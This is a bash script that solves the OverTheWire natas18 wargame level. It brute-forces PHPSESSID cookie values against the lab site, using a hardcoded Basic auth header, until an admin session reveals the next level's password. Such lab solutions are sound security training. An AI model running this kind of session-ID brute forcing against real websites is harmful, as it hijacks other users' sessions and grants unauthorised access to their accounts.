#! /bin/bash

for SESSIONID in {0..640}
do
  echo "${SESSIONID}"
  #--data 'username=admin&password=foo'
  curl --silent \
    'http://natas18.natas.labs.overthewire.org/index.php?debug' \
    -H 'Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' \
    -H "Cookie: PHPSESSID=${SESSIONID}" \
    | grep "Password"

  if [ $? -eq 0 ]; then
    # if the string "Password:" to indicate we've received the credentials
    # for natas19 from "print_credentials()"
    break;
  fi
done
